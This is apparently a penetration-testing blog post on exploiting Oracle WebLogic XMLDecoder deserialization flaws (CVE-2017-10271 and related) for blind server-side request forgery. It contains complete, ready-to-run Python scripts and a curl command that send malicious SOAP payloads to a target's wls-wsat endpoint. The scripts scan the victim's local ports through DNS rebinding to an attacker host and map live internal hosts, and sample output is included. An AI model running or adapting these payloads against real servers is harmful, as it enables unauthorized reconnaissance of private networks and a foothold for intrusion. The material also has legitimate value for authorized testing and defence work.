---
layout: post
title: "Blind SSRF with Oracle WebLogic Deserialization"
date: 2020-09-26 22:00:00 +0300
author: snovvcrash
categories: /pentest
tags: [external-pentest, oracle, weblogic, java-deserialization, bind-ssrf, dns-rebinding, python]
published: true
---

A way to get an impact from exploiting Oracle WebLogic Server Java deserialization vulnerabilities (CVE-2017-3506, CVE-2017-10271, CVE-2019-2725, CVE-2019-2729, etc.) without triggering RCE through an SSRF attack.

<!--cut-->

![banner.png](/assets/images/blind-ssrf-with-oracle-weblogic-deserialization/banner.png)
{:.center-image}

* TOC
{:toc}

## Prologue

If you have discovered a running instance of Oracle WebLogic Server (>= 12.2.1.3) that is vulnerable to a Java deserialization attack during a pentest engagement but firing up RCE directly is not acceptable for you for some reason, then there is an alternative way to show impact to the Customer with an SSRF attack.

This type of vulnerabilities is usually exploited via deserialization of the `java.lang.ProcessBuilder` class to achieve command execution at the victim's host. Another class that can be successfully deserialized with a malicious SOAP request is `java.net.URL` which tries to interact with the provided URL. This attack scenario is implemented in [this](https://github.com/kkirsche/CVE-2017-10271) CVE-2017-10271 checker, for example. We can combine this trick with a blind SSRF attack to scan local ports listening on the target machine as well as discover new hosts within target's local network.

## Local Port Scan

### Python Simple HTTP Server

I built the following Python script and looped it through every TCP port at victim's localhost.

The script is mainly based on the [1u.ms](http://1u.ms/) service for DNS rebinding: it brings up a simple HTTP server on the attacker's box and then sends a malicious SOAP request to the target with `http://make-127.0.0.1-and-<ATTACKER_IP>rr.1u.ms:<PORT>` as a payload. If the target host **does not** have provided `<PORT>` opened, then DNS rebinding will be triggered and I will see that the response from victim came back right to my host (because the DNS query could not be resolved to victim's `127.0.0.1:<PORT>`). If the target host **does** have this `<PORT>` opened, then DNS rebinding will not be triggered and I will not see a response on my box which means victim's machine successfully resolved this DNS query to its localhost at the first place.

```
$ for port in `seq 1 65535`; do sudo python3 -u ssrf-port-scan.py $port 2>&1 | tee -a ports.log; done
```

```python
#!/usr/bin/env python3

import sys
import urllib3
from threading import Thread
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer

import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class HTTPServerInThread(Thread):

	def __init__(self, address, port):
		super().__init__()
		self.address = address
		self.port = port
		self.httpd = TCPServer((address, port), SimpleHTTPRequestHandler)

	def run(self):
		#print(f'[*] Serving HTTP on {self.address} port {self.port} (http://{self.address}:{self.port}/) ...')
		self.httpd.serve_forever()


class Default(dict):

	def __missing__(self, key):
		return '{' + key + '}'


if __name__ == '__main__':
	port = int(sys.argv[1])

	headers = {'Content-Type': 'text/xml;charset=UTF-8'}
	data = f"""<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8" class="java.beans.XMLDecoder">
        <void id="url" class="java.net.URL">
          <string>http://make-127.0.0.1-and-<ATTACKER_IP>rr.1u.ms:{port}</string>
        </void>
        <void idref="url">
          <void id="stream" method = "openStream" />
        </void>
      </java>
    </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
"""

	server = HTTPServerInThread(address='0.0.0.0', port=port)
	server.daemon = True
	server.start()

	print(port)
	resp = requests.post('http://<TARGET_IP>/wls-wsat/CoordinatorPortType', headers=headers, data=data, verify=False)
	if resp.status_code != 500:
		print(f'[?] Status code for port {port} is {resp.status_code}')
```

Here is a PoC request that validates that the default WebLogic Server 7001/TCP port is listened on victim's 127.0.0.1:

[![burp-poc-7001.png](/assets/images/blind-ssrf-with-oracle-weblogic-deserialization/burp-poc-7001.png)](/assets/images/blind-ssrf-with-oracle-weblogic-deserialization/burp-poc-7001.png)
{:.center-image}

### tcpdump

An easier way to validate status of the remote port is to use tcpdump to monitor victim's responses:

```
$ sudo tcpdump -n -i eth0 -A -s0 'src <TARGET_IP> and tcp'
$ curl -i -s -k -X $'POST' \
    -H $'Host: <TARGET_IP>' \
    -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36' \
    -H $'Accept-Encoding: gzip, deflate' -H $'Accept: */*' -H $'Connection: close' -H $'Content-Type: text/xml;charset=UTF-8' -H $'Content-Length: 574' \
    --data-binary $'<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\x0d\x0a  <soapenv:Header>\x0d\x0a    <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\x0d\x0a      <java version=\"1.8\" class=\"java.beans.XMLDecoder\">\x0d\x0a        <void id=\"url\" class=\"java.net.URL\">\x0d\x0a          <string>http://make-127.0.0.1-and-<ATTACKER_IP>rr.1u.ms:7001</string>\x0d\x0a        </void>\x0d\x0a        <void idref=\"url\">\x0d\x0a          <void id=\"stream\" method = \"openStream\" />\x0d\x0a        </void>\x0d\x0a      </java>\x0d\x0a    </work:WorkContext>\x0d\x0a    </soapenv:Header>\x0d\x0a  <soapenv:Body/>\x0d\x0a</soapenv:Envelope>' \
    $'http://<TARGET_IP>/wls-wsat/CoordinatorPortType'
```

## Host Discovery

A similar approach can be used to discover live hosts within victim's local network. This attack is even more blind because you should guess a network range first as well as make a guess which port is definitely opened on a testing machine. I chose the 88 port to discover Kerberos KDC service on domain controllers within `192.168.10.0/24` network as an example. I do not use DNS rebinding here but instead look for request timeout events to differentiate live hosts:

```python
#!/usr/bin/env python3

import urllib3
from ipaddress import IPv4Network

import requests

if __name__ == '__main__':
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        headers = {'Content-Type': 'text/xml;charset=UTF-8'}

        port = 88
        for ip in (str(i) for i in IPv4Network('192.168.10.0/24')):
                data = f"""<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8" class="java.beans.XMLDecoder">
        <void id="url" class="java.net.URL">
          <string>http://{ip}:{port}</string>
        </void>
        <void idref="url">
          <void id="stream" method="openStream" />
        </void>
      </java>
    </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
"""

                try:
                        resp = requests.post('http://<TARGET_IP>/wls-wsat/CoordinatorPortType', headers=headers, data=data, verify=False, timeout=4)
                except requests.Timeout:
                    print(f'[-] {ip}:{port}')
                else:
                    print(f'[+] {ip}:{port}')
```

```
$ python3 -u ssrf-host-discovery.py | tee -a hosts.log
[-] 192.168.10.0:88
[-] 192.168.10.1:88
[-] 192.168.10.2:88
[-] 192.168.10.3:88
[-] 192.168.10.4:88
[-] 192.168.10.5:88
[-] 192.168.10.6:88
[-] 192.168.10.7:88
[-] 192.168.10.8:88
[-] 192.168.10.9:88
[+] 192.168.10.10:88
[-] 192.168.10.11:88
[-] 192.168.10.12:88
[-] 192.168.10.13:88
```

## Refs

* [Плохая логика. Выполняем произвольный код в популярном сервере приложений Oracle WebLogic — «Хакер»](https://xakep.ru/2018/01/18/oracle-weblogic-exploit/)
* [Подделка серверных запросов, эксплуатация Blind SSRF / Взрывной блог](https://bo0om.ru/blind-ssrf)
